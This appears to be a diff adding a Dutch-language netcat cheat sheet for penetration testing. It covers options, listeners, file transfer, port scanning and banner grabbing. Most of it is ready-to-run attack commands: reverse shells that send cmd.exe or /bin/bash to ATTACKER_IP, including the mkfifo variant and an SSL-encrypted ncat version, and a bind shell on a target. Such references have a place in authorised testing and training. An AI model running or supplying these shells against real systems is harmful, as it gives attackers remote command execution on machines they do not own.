@@ -1,0 +1,60 @@
+# Netcat (nc) — TCP/UDP verbindingen, reverse shells, file transfer
+# Swiss army knife voor netwerk verbindingen — luisteren, verbinden, data versturen
+#
+# === Syntax ===
+# nc [opties] HOST PORT
+# nc -lvnp PORT                    (listener)
+#
+# === Belangrijkste opties ===
+# -l             Listen mode (wacht op verbinding)
+# -v             Verbose output
+# -n             Geen DNS resolutie (sneller)
+# -p PORT        Poortnummer (bij listen)
+# -e PROG        Programma uitvoeren bij verbinding (niet altijd beschikbaar)
+# -u             UDP in plaats van TCP
+# -w TIMEOUT     Timeout in seconden
+# -z             Zero-I/O mode (port scanning)
+# -k             Keep listening na disconnect (Linux)
+#
+# === Voorbeelden ===
+
+# === Listener (attacker kant) ===
+nc -lvnp 443
+
+# === Reverse shells ===
+# Windows
+nc.exe -e cmd.exe ATTACKER_IP 443
+
+# Linux
+nc -e /bin/bash ATTACKER_IP 443
+
+# Als -e niet beschikbaar is (mkfifo methode)
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER_IP 443 > /tmp/f
+
+# === Bind shell ===
+# Op doelwit (luistert)
+nc -lvnp 4444 -e /bin/bash
+
+# Verbinden vanaf attacker
+nc TARGET 4444
+
+# === File transfer ===
+# Ontvanger (wacht op bestand)
+nc -lvnp 4444 > bestand.exe
+
+# Verzender
+nc TARGET 4444 < bestand.exe
+
+# Met ncat (Nmap versie) — SSL encrypted
+ncat --ssl -lvnp 443
+ncat --ssl ATTACKER_IP 443 -e /bin/bash
+
+# === Port scanning ===
+nc -zvn TARGET 1-1000
+
+# === Banner grabbing ===
+nc -vn TARGET 80
+# Typ: HEAD / HTTP/1.0 <enter><enter>
+
+# Noot: Op Windows gebruik nc.exe of ncat.exe
+# Noot: Sommige versies ondersteunen -e niet (veiligheidsreden)
